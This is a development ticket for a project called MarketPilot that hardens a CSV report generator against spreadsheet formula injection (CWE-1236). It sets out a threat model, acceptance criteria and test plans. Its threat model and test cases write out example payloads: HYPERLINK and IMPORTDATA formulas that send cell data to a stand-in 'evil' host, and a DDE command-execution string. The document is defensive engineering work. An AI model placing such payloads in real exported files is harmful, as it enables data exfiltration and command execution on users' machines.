# Story 3.5a: CSV Formula Injection Hardening

**Epic:** 3 — Report Generation Pipeline
**Story:** 3.5a (retroactive hardening against Story 3.5)
**Story Key:** 3-5a-csv-formula-injection-hardening
**Status:** ready-for-dev
**Date Created:** 2026-04-20
**Origin:** Deferred-work item "CSV formula injection (CWE-1236) — competitor-controlled cells unescaped (Story 3.5 / 4.3)" — surfaced in Story 4.3 code review (PR #46). Elevated ahead of Epic 5 frontend work because the seller-facing CSV download must not ship with a known CWE.

---

## User Story

As the operator of MarketPilot,
I want `src/workers/scoring/buildReport.js` to neutralise spreadsheet-formula payloads in competitor-controlled text cells of the generated CSV,
So that a malicious seller cannot weaponise their `product_title` (attacker-controllable via any Mirakl P11 listing) to exfiltrate credentials or execute commands when Pedro or a seller opens `marketpilot-report.csv` in Excel, LibreOffice Calc, or Google Sheets.

**Satisfies:** OWASP CSV Injection prevention (CWE-1236). Hardens Story 3.5's `buildReport.js` without breaking the exact-byte `csv_data` fixtures asserted by the Story 3.5 and Story 4.3 ATDD tests.

---

## Threat Model (context the developer MUST internalise)

- **Attacker:** any seller with an active listing on Worten PT or Worten ES.
- **Attack surface:** `product_title` (and to a lesser degree `shop_sku`, `ean`) returned by Mirakl P11 for a competitor's listing. The worker merges these strings into the seller's downloadable CSV verbatim.
- **Trigger:** Pedro or the seller opens `marketpilot-report.csv` in Excel / LibreOffice Calc / Google Sheets. Cells whose first character is in `= + - @ \t \r` are interpreted as formulas at load time.
- **Impact examples:**
  - `=HYPERLINK("https://evil/steal?c="&A1,"click")` — data exfiltration on click
  - `=IMPORTDATA("https://evil/steal?c="&A1)` — Google Sheets auto-fires without user interaction
  - `=cmd|' /C calc'!A0` — DDE-based RCE on older Excel builds
- **Severity:** MEDIUM — requires the CSV to be opened in a spreadsheet app (not `cat` / Notepad / `Preview.app`). But since the product IS a CSV meant to be opened in Excel, the pre-condition is effectively "normal use".

---

## Acceptance Criteria

**AC-1: Cell classification by column type is explicit in `buildReport.js`**
- The 12 CSV columns are partitioned into two groups:
  - **Text columns (attacker-controllable):** `EAN`, `product_title`, `shop_sku`
  - **Numeric columns (system-computed):** `my_price`, `pt_first_price`, `pt_gap_eur`, `pt_gap_pct`, `pt_wow_score`, `es_first_price`, `es_gap_eur`, `es_gap_pct`, `es_wow_score`
- The source file makes this classification visually obvious at the row-building call site (e.g. two distinct helper calls `escapeTextCell()` vs `escapeCell()`, with a comment explaining why).

**AC-2: A new `escapeTextCell(val)` helper prefixes `'` when the first character is a formula trigger**
- Formula triggers are: `=`, `+`, `-`, `@`, `\t` (0x09, tab), `\r` (0x0D, carriage return)
- When `val` is null / undefined / empty string → returns `''` (unchanged behaviour; no prefix).
- When the first character of the stringified value is a formula trigger → the cell is prefixed with a single straight-quote `'` BEFORE RFC 4180 quoting.
- After prefixing, standard RFC 4180 quoting still applies: if the resulting string contains `,`, `"`, `\n`, or `\r`, wrap in `"..."` with internal `"` doubled.
- Leading-whitespace bypass is NOT handled (a `product_title` like `" =cmd"` is NOT prefixed) — Excel generally treats leading whitespace as literal, so this is acceptable. Document the trade-off in a source comment.

**AC-3: Text columns in the row builder use `escapeTextCell`; numeric columns use `escapeCell`**
- In `buildAndPersistReport`'s row loop, the three text-column reads (`entry.ean`, `entry.product_title`, `entry.shop_sku`) go through `escapeTextCell`; all nine numeric-column reads continue to use `escapeCell`.
- `escapeCell` itself remains unchanged (RFC 4180 quoting only) so that numeric cells like `"-0.50"` (a legitimate gap value with a leading minus) are NOT prefixed with `'` and regression-safe for downstream numeric parsers.

**AC-4: Source-level comment that previously deferred this fix is removed or updated**
- The comment block at `src/workers/scoring/buildReport.js:22-29` (which explicitly said formula injection was deferred) is replaced by a short comment describing the new classification pattern (text cells neutralised, numeric cells pass through).

**AC-5: Existing ATDD exact-byte fixtures remain green with zero changes**
- `tests/epic3-3.5-report-persistence.atdd.test.js` uses fixture `csv_data: 'EAN,product_title\n1234,Test'` — neither `1234` nor `Test` starts with a trigger char; this file is NOT modified.
- `tests/epic4-4.3-get-api-reports-and-csv.atdd.test.js` uses a `SAMPLE_CSV` where the three text cells are `1234567890123`, `"Test Product"`, and `SKU-001` — none start with a trigger char; this file is NOT modified either.
- If the dev discovers ANY existing fixture whose text cells start with a trigger char (e.g. a new fixture added during implementation), the dev MUST treat this as a signal that the fixture itself was unsafe and update it to use a safe example — NOT weaken `escapeTextCell`.

**AC-6: New behavioural tests cover every trigger character**
- A new file `tests/epic3-3.5a-csv-formula-injection.additional.test.js` is created.
- It exercises `buildAndPersistReport` (NOT `escapeTextCell` in isolation — behavioural, not keyword-grep, per the project's test-quality convention).
- For each trigger character (`=`, `+`, `-`, `@`, `\t`, `\r`): construct a catalog entry with that character as the first character of `product_title`, call `buildAndPersistReport`, retrieve the persisted `csv_data` via `getReport`, and assert that the corresponding cell in the CSV starts with `'` followed by the original title.
- Additional cases: a `product_title` starting with a safe character (`Samsung Galaxy`) is NOT prefixed; a `product_title` containing (but not starting with) `=HYPERLINK(...)` is NOT prefixed (only first-char matters); a `product_title` equal to `""` (empty) produces an empty cell with no prefix.
- An end-to-end realistic payload test: `product_title = '=HYPERLINK("http://evil/steal","click")'` is persisted as `'=HYPERLINK("http://evil/steal","click")'` in the CSV — the cell starts with `'`, then `=`, and RFC 4180 quotes wrap the whole thing because it contains commas and `"`.

**AC-7: `npm test` remains green**
- All existing suites (including 3.1, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7, 4.1, 4.2, 4.3) continue to pass unchanged.
- The new `.additional.test.js` file is discovered automatically by the existing glob (`tests/**/*.test.js` — see `package.json:test`), so no package.json edit is required.

**AC-8: No Mirakl API calls, no MCP changes, no DB schema changes**
- This is a pure string-formatting change inside `buildReport.js`. No new imports. No new dependencies. No column additions. No route changes.

---

## Tasks / Subtasks

- [ ] **Task 1: Add `escapeTextCell()` helper in `src/workers/scoring/buildReport.js`** (AC: 2, 4)
  - [ ] Add `const FORMULA_TRIGGERS = new Set(['=', '+', '-', '@', '\t', '\r'])` at module scope (or use a regex — dev's call, whichever reads cleaner).
  - [ ] Define `function escapeTextCell(val)` that:
    - Returns `''` for null / undefined / empty string (parity with `escapeCell`).
    - Coerces value to string via `String(val)`.
    - Prefixes the string with `'` if the first char is in `FORMULA_TRIGGERS`.
    - Then applies RFC 4180 quoting (delegating to the existing `escapeCell` logic OR inlining it — dev's call; prefer delegation via `escapeCell(prefixedStr)` to avoid duplication).
  - [ ] Update the source-level comment at lines 22-29 — remove the "deferred" language, briefly explain the text-vs-numeric classification.

- [ ] **Task 2: Update the row builder in `buildAndPersistReport`** (AC: 1, 3)
  - [ ] Change the first three row-array entries (EAN, product_title, shop_sku) from `escapeCell(...)` to `escapeTextCell(...)`.
  - [ ] Leave the other nine (all numeric) as `escapeCell(...)`.
  - [ ] Add an inline comment above the row array explaining the classification — a reader should understand at a glance why EAN / product_title / shop_sku get a different escaper.

- [ ] **Task 3: Create `tests/epic3-3.5a-csv-formula-injection.additional.test.js`** (AC: 6)
  - [ ] Import `buildAndPersistReport` from `src/workers/scoring/buildReport.js`.
  - [ ] Import `getReport` from `src/db/queries.js` for round-trip verification.
  - [ ] Set up in-memory SQLite (see `tests/epic3-3.5-report-persistence.atdd.test.js` for the established pattern — same DB setup helper).
  - [ ] Seed a catalog entry per test case; call `buildAndPersistReport`; read back via `getReport`; split `csv_data` by `\n`; assert on the data row.
  - [ ] Cover six trigger characters (`=`, `+`, `-`, `@`, `\t`, `\r`), two negative cases (safe-first-char + dangerous-mid-string), one empty-string case, and the realistic HYPERLINK payload.
  - [ ] Also assert: the CSV header row is UNCHANGED (still the 12-column spec header — no leading `'`). The header is a literal string, not a cell value.

- [ ] **Task 4: Manual smoke test — open the generated CSV** (AC: 2)
  - [ ] Run one of the new unit tests locally or via a quick Node script, extract the `csv_data` string, write it to `/tmp/test.csv`, open in LibreOffice Calc or Google Sheets.
  - [ ] Verify the malicious cells render as literal text, NOT as formulas. No HYPERLINK link, no IMPORTDATA fetch.
  - [ ] Report the smoke test result in `Dev Agent Record → Completion Notes List`.

- [ ] **Task 5: Regression sweep** (AC: 5, 7)
  - [ ] Run `npm test` — all 441+ tests green.
  - [ ] Specifically verify: `tests/epic3-3.5-report-persistence.atdd.test.js` and `tests/epic4-4.3-get-api-reports-and-csv.atdd.test.js` both pass WITHOUT any fixture changes. If either fails, STOP and re-check — the fix may have introduced an unexpected byte-level difference.

---

## Dev Notes

### Why this is a separate story, not a patch to 3.5

Story 3.5 is closed and its original scope did not include formula-injection neutralisation — the source comment at lines 22-29 explicitly deferred it ("This MVP does NOT prefix such cells with a leading ' — it would break the exact-byte contract…"). Now that the exact-byte contract has been frozen by ATDD tests whose fixtures are provably safe (no trigger chars in their text cells), the neutraliser can be added WITHOUT touching fixtures. Retrofitting as a sibling story (`3-5a`) makes the commit history self-documenting: Story 3.5 shipped the CSV; Story 3.5a hardened it against a specific CWE.

### Why `escapeTextCell` (new) rather than modifying `escapeCell`

Numeric columns include legitimately-negative values (`-0.50` gap, `-10.00€` difference). If `escapeCell` prefixed every cell starting with `-`, Excel would show `'-0.50` — visually fine, but any downstream parser (e.g. pandas `read_csv` without `skipinitialspace=True`) would keep the `'` as part of the cell value, corrupting numeric imports. Split helpers keeps numeric cells format-preserving and restricts the neutraliser to cells that are actually attacker-controlled. This is also the pattern OWASP recommends.

### ATDD fixture safety review

The dev MUST verify (not just trust this story) that the following existing fixtures contain NO text cells starting with a trigger char:

1. `tests/epic3-3.5-report-persistence.atdd.test.js` — scan all calls to `insertReport` / `buildAndPersistReport`. Text cells are at positions 1-3 of any CSV row (EAN, product_title, shop_sku).
2. `tests/epic4-4.3-get-api-reports-and-csv.atdd.test.js` — the `SAMPLE_CSV` constant near line 57 is the only CSV fixture; verify its text cells.
3. `tests/epic3-3.5-report-persistence.additional.test.js` — if it exists (the legacy allowlist references it). If it exists and contains a text cell starting with a trigger, the dev's job is to make that test robust, not to weaken the neutraliser.

If ANY text cell starts with a trigger char, the fixture itself is suspect — treat it as a data point about the test's unrealistic assumptions, update the fixture to a safer realistic example, and flag in `Dev Agent Record → Debug Log References`.

### The source-code threat-model comment should survive

Even after the fix ships, `buildReport.js` should contain a short comment explaining WHY text cells go through a different escaper. Future devs (or future me) need to see the threat model without hunting through git history. Something like:

```javascript
// Text columns (ean, product_title, shop_sku) are attacker-controllable via
// Mirakl P11 competitor listings. escapeTextCell prefixes any formula-trigger
// first-character (= + - @ \t \r) with a single quote so Excel/Sheets treat
// the cell as text, not as a formula. Numeric columns are system-computed and
// do NOT go through the prefixer — a legitimate "-0.50" gap must stay a
// machine-parseable number.
```

### File locations

```
src/workers/scoring/buildReport.js                                   ← MODIFY
tests/epic3-3.5a-csv-formula-injection.additional.test.js            ← CREATE
```

No other files change. No migrations, no schema, no route, no worker wiring, no package.json.

### ESM & project conventions (reminder)

- ESM: `import` / `export`. No `require`.
- Never `console.log`. This file has no logging — fine.
- `insertReport` is called via `queries.js` — `buildReport.js` does not import `db`/`drizzle` directly. Keep that invariant.

### Deferred-work entry this story satisfies

From `_bmad-output/implementation-artifacts/deferred-work.md`, section "Deferred from: code review of 4-3-get-api-reports-and-csv (2026-04-19)":

> **CSV formula injection (CWE-1236) — competitor-controlled cells unescaped (Story 3.5 / 4.3)**
> **Action**:
> 1. In `buildReport.js`, classify cells: numeric cells … pass through as-is; text cells (`ean`, `product_title`, `shop_sku`) run through a second pass that prefixes a leading `'` when the first char is in `[=+\-@\t\r]`.
> 2. Update Story 3.5 ATDD / `additional.test.js` to cover each dangerous prefix for text cells and assert neutraliser is applied.
> 3. Update Story 4.3 ATDD fixtures (`SAMPLE_CSV`) if the build-time output format changes, so the exact-byte assertion stays in sync.
> 4. Consider also sanitising `email` at write-time — currently written to the DB untrimmed, though email never reaches the CSV.

This story closes items 1 and 2. Item 3 is a no-op (current fixtures are already safe). Item 4 (email trimming) is OUT OF SCOPE for this story — it is a separate concern tracked under the PR #44 deferred-work section ("Email trimming not implemented on POST /api/generate") and belongs in Epic 4 follow-up.

### No Mirakl API calls, no MCP verification

This is pure internal string formatting. The Mirakl MCP is authoritative for endpoint contracts, not CSV output rules. No MCP check required.

---

## Architecture Guardrails

| Boundary | Rule |
|---|---|
| `src/workers/scoring/buildReport.js` | Only source file touched. Add `escapeTextCell` helper + classification comment. |
| `escapeCell` | DO NOT MODIFY its behaviour. Numeric cells still go through it unchanged. |
| `insertReport` / DB schema | NO changes. `csv_data` column is still a plain TEXT column. |
| Fixtures | PRESERVE byte-for-byte. If a fixture would have been broken, the fixture itself was unrealistic — update the fixture, not the neutraliser. |
| `src/routes/reports.js` | DO NOT MODIFY. Route still streams `csv_data` verbatim. Neutraliser lives in the build step, not the read step. |
| New test file | Behavioural (calls `buildAndPersistReport` with fixtures; reads result via `getReport`) — not keyword-grep. |

---

## Story Dependencies

**This story (3.5a) requires (all done):**
- Story 3.5 (done) — `buildReport.js` exists with the `buildAndPersistReport` function and the `escapeCell` helper
- Story 3.4 (done) — `computeReport` shape unchanged
- Story 1.3 (done) — `reports` table schema + `insertReport` / `getReport` in `queries.js`

**Stories that depend on 3.5a:**
- None directly. Future consumers (CSV downloads by Pedro or sellers) benefit transparently with no contract change.
- Epic 5 (frontend) does not block on this — there is no frontend CSV rendering in 5.1/5.2. But shipping this BEFORE Epic 5 is the Epic 4 retro commitment, because Epic 5 surfaces the CSV download CTA to users.

---

## Previous Story Intelligence

**From Story 3.5 (Report Persistence and CSV Generation — done 2026-04-18):**
- `buildAndPersistReport(reportId, email, catalog, computedReport)` is the single entry point. It builds the CSV string in-memory, then calls `insertReport` to persist.
- The CSV is constructed row-by-row with a literal header as first line, then one row per catalog entry.
- `escapeCell` implements RFC 4180 (comma / quote / CR / LF). Does NOT touch formula triggers.
- `catalog` entries come straight from Mirakl OF21 — `ean`, `shop_sku`, `product_title`, `price`. These are attacker-controllable for competitor listings because competitors seed their own product metadata.

**From Story 4.3 code review (PR #46, merged 2026-04-19):**
- The CSV route at `src/routes/reports.js` streams `csv_data` verbatim — it is innocent; the fix must live in the build step.
- The route DOES add `Content-Type: text/csv; charset=utf-8` and `Content-Disposition: attachment; filename="marketpilot-report.csv"` — both unchanged by this story.

**From Epic 4 retrospective (2026-04-20):**
- This hardening was elevated to the pre-Epic-5 critical path: "CSV formula injection retrofit — ship before Story 5.1 dev begins. Only live defect; user-facing impact."
- Pedro's own take: Gabriel will open these CSVs in Excel — this is not a theoretical risk.

**From BAD testing conventions (Epic 3 retro):**
- Tests must be BEHAVIOURAL — call the real implementation with fixtures, assert on observable output. Keyword-grep / source-scan tests are not acceptable for behavioural invariants.
- ATDD fixtures are the contract. Never modify a fixture to make a failing test pass.

---

## Verification Checklist

After completing all tasks, verify:

- [ ] `src/workers/scoring/buildReport.js` exports `buildAndPersistReport` with the same signature as before (retroactive hardening is invisible to callers).
- [ ] `escapeTextCell(val)` helper exists in `buildReport.js` and is used for exactly three columns in the row builder (EAN, product_title, shop_sku).
- [ ] `escapeCell` is unchanged in behaviour — numeric columns still hit it directly and produce identical output for safe inputs.
- [ ] Source-level comment at former lines 22-29 no longer calls this a "deferred trade-off" — it now documents the text-vs-numeric split.
- [ ] `tests/epic3-3.5a-csv-formula-injection.additional.test.js` exists and contains behavioural tests (not source-text scans) for each of the six trigger characters.
- [ ] At least one test asserts the realistic HYPERLINK payload is neutralised end-to-end via `buildAndPersistReport` → `getReport` → CSV parse.
- [ ] At least one test asserts a SAFE-first-character title (`Samsung Galaxy S24`) is NOT prefixed.
- [ ] At least one test asserts a mid-string trigger (title `Product = great`) is NOT prefixed — only the first char matters.
- [ ] The CSV header row (first `\n`-split line of `csv_data`) is the literal `EAN,product_title,shop_sku,my_price,...` — no leading `'`.
- [ ] Manual Excel/Sheets smoke test: malicious cell renders as literal text, formula does NOT execute. Result recorded in Dev Agent Record.
- [ ] `npm test` — all tests pass including unchanged 3.5 and 4.3 ATDD fixtures.
- [ ] No new dependencies added. No schema migration. No route change.

---

## Out of Scope (intentionally, for a future story)

- **Email trimming at write time** — deferred-work action item #4 for this same review. Lives in Epic 4 follow-up, not here.
- **Unicode homoglyph triggers** (e.g. Cyrillic `=`) — OWASP guidance does not require this; Excel/Sheets do not treat homoglyphs as formula triggers.
- **Character-class expansion** (e.g. neutralise cells starting with whitespace followed by a trigger) — Excel generally treats leading whitespace as literal. Not worth the complexity for MVP.
- **Applying the neutraliser to `email` or `shop_sku` as they flow into the DB** — those fields never reach the CSV through this path; neutralisation here only covers the CSV output.

---

## Dev Agent Record

### Agent Model Used

_to be filled by dev agent_

### Debug Log References

_to be filled by dev agent_

### Completion Notes List

_to be filled by dev agent — MUST include the result of the manual Excel/Sheets smoke test (Task 4)_

### File List

_to be filled by dev agent_

### Change Log

- 2026-04-20: Story 3.5a created — retrospective CSV formula injection (CWE-1236) hardening against Story 3.5's `buildReport.js`. Pre-Epic-5 critical path item per Epic 4 retrospective.
